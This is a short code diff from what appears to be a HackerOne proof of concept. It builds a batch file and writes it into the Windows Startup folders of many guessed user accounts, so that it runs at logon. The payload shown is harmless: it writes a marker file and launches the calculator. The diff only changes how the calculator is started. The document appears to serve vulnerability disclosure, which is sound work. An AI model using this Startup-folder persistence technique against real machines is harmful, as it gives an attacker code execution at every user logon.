@@ -56,7 +56,7 @@ to write a Startup <code>.bat</code>. The marker written by the .bat is
     'ethan','noah','liam','emma','olivia','sophia','ava','isabella','mia','charlotte',
     'kalena','ktester','kalena-tester','kalena_h1','wearehackerone','pepis #1'
   ];
-  const bat = '@echo off\r\necho H1LOGON-251 > C:\\Users\\Public\\h1logon-251.txt\r\nstart calc.exe\r\n';
+  const bat = '@echo off\r\necho H1LOGON-251 > C:\\Users\\Public\\h1logon-251.txt\r\nstart "" "ms-calculator:"\r\n';
   const paths = users.map(u =>
     'C:\\Users\\' + u + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
   paths.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
